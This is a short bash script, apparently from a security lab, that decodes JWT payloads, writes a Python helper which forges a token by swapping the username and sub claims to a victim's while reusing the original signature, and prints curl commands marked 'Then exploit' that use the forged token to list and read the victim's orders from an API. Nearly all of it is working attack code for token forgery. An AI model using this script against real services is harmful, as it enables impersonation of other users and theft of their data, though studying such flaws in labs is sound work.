#!/bin/bash

echo "=== Decoding token payloads ==="
python3 - <<'PY'
import os, json, base64

def decode(t):
    p = t.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p.encode()))

for name in ["TOKEN_B", "TOKEN_C"]:
    data = decode(os.environ[name])
    print(f"\n{name}")
    print(f"  username: {data.get('username')}")
    print(f"  sub     : {data.get('sub')}")
PY

echo
echo "Set VICTIM_USER:"
echo '  export VICTIM_USER="<paste User C username/sub from above>"'
echo

cat <<'EOF' > /tmp/forge_jwt.py
import os, json, base64

t = os.environ["TOKEN_B"]
victim = os.environ["VICTIM_USER"]
h, p, s = t.split(".")
p += "=" * (-len(p) % 4)
data = json.loads(base64.urlsafe_b64decode(p.encode()))

data["username"] = victim
data["sub"] = victim

new_p = base64.urlsafe_b64encode(
    json.dumps(data, separators=(",", ":")).encode()
).rstrip(b"=").decode()

print(f"{h}.{new_p}.{s}")
EOF

echo "Forge command:"
echo '  export FAKE_AS_C="$(python3 /tmp/forge_jwt.py)"'
echo '  echo "Forged token length: ${#FAKE_AS_C}"'
echo

cat <<'EOF'
Then exploit:

  curl -s "$API" \
    -H "content-type: application/json" \
    -H "authorization: $FAKE_AS_C" \
    --data-raw '{"action":"orders"}' | jq

  export ORDER_C="<paste victim order-id>"

  curl -s "$API" \
    -H "content-type: application/json" \
    -H "authorization: $FAKE_AS_C" \
    --data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_C\"}" | jq
EOF
